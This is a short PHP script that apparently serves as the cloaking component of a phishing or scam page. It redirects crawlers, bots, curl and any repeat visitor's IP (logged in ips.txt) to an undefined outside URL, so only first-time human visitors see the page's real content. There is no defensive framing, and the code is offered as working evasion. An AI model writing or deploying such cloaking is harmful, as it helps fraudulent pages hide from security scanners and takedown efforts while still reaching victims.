<?php


if (!empty($_SERVER['HTTP_CLIENT_IP']))  
    {

      $vis_ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   
    {
      $vis_ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $vis_ip=$_SERVER['REMOTE_ADDR'];
    }


$agent = $_SERVER['HTTP_USER_AGENT'];


if(preg_match('/bot|yahoo|google|spider|crawler|curl|^$/i', $agent))
{
	header("Location: $out_url");
	die();
}

$data   = file_get_contents('ips.txt'); 


if (strpos($data, "\r\n") !== false) {
    $data   = explode("\r\n", $data);
}
else
{
$data   = explode("\n", $data);
}




if (in_array($vis_ip,$data))
{ echo '<script>window.location.assign("'.$out_url.'")</script>';

$file=fopen("ips.txt","a+"); 
          fwrite($file,$vis_ip."\r\n");
fclose($file); 
die();
}
$file=fopen("ips.txt","a+"); 
          fwrite($file,$vis_ip."\r\n");
fclose($file); 







?>